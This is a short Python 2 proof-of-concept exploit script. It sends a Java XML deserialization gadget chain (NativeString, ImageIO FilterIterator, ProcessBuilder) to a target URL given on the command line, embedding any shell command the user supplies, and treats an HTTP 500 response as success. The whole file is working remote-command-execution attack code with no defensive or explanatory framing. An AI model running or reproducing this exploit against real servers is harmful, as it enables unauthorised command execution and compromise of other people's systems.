import requests
import sys


class POC:
    def __init__(self):
        self.url = ''

    def verify(self,url = None,command = None):
        try:
            payload = """<map> 
            <entry> 
            <jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"><command>{0}</command><redirectErrorStream>false</redirectErrorStream></next> </iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method> <class>java.lang.ProcessBuilder</class><name>start</name> <parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer> <done>false</done><ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed></is><consumed>false</consumed></dataSource> <transferFlavors/></dataHandler><dataLen>0</dataLen></value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry> <entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
            </entry> 
            </map>
            """
            target = self.url if self.url else url
            command = self.commandAnalyz(command)
            payload = payload.format(command)
            if target:
                header = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language' : 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Content-Type': 'application/xml'
                }
                t = requests.post(target,headers = header,data=payload)
                if t.status_code == 500:
                    return True
        except :
            pass

    def commandAnalyz(self,strcommand):
        pcode = '<string>{0}</string>'
        temp = ''
        t = strcommand.split(' ')
        for ele in t:
            temp += pcode.format(ele)
        return temp


if __name__ == '__main__':
    url = sys.argv[1]
    command = sys.argv[2]
    test = POC()
    print test.verify(url,command)



